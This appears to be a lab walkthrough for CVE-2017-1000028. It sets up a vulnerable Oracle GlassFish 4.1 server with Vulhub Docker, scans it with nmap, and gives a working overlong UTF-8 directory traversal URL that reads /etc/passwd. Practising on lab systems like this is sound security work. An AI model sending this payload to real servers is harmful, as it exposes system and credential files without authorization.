# Oracle GlassFish Server 4.1 — Directory Traversal

## Overview

**Oracle GlassFish Server 4.1** is vulnerable to a **directory traversal attack** using **UTF-8 encoded sequences**.

This vulnerability allows attackers to access arbitrary files on the server such as:

- `/etc/passwd`
- `/etc/hosts`
- `/etc/shadow`

**CVE ID:** CVE-2017-1000028  
**Exploit Database:** EDB-ID 39441

---

# Environment Setup

Use the **Vulhub Docker setup** to simulate the vulnerable environment.

    cd /opt/vulhub/glassfish/CVE-2017-1000028/

    docker compose build

    docker compose up -d

---

# Verification

Check if the GlassFish server is running and identify exposed ports.

    netstat -nltup

### Scan with Nmap

    nmap -v -sT -sV -sC -A -p 4848 192.168.1.103

Expected output:

    4848/tcp open  ssl/http  Oracle GlassFish 4.1 (Servlet 3.1; JSP 2.3; Java 1.8)

---

# Exploitation

Access sensitive files using **UTF-8 encoded directory traversal sequences**.

## Read `/etc/passwd`

    https://192.168.1.103:4848/theme/META-INF/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
